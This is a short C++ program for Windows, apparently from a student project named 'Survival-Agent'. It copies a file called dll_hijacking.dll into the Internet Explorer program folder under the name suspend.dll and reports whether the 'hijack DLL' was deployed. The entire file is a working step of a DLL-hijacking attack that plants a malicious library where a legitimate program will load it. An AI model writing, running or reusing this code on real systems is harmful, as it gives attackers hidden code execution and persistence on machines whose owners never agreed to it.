#include <windows.h>
#include <iostream>

int main() {
    LPCSTR destPath = "C:\\Program Files\\Internet Explorer\\suspend.dll";
    LPCSTR sourcePath = "C:\\Users\\abdul\\Downloads\\FYP\\Survival-Agent\\knowledge_library\\dll_hijacking.dll";
    
    // Check if we can write to the directory by attempting to copy.
    if (CopyFileA(sourcePath, destPath, FALSE)) {
        std::cout << "[SUCCESS] Hijack DLL deployed to C:\\Program Files\\Internet Explorer" << std::endl;
    } else {
        std::cerr << "[FAILURE] Access Denied or file not found. Need Admin for Program Files or source file is missing. Error: " << GetLastError() << std::endl;
    }
    return 0;
}
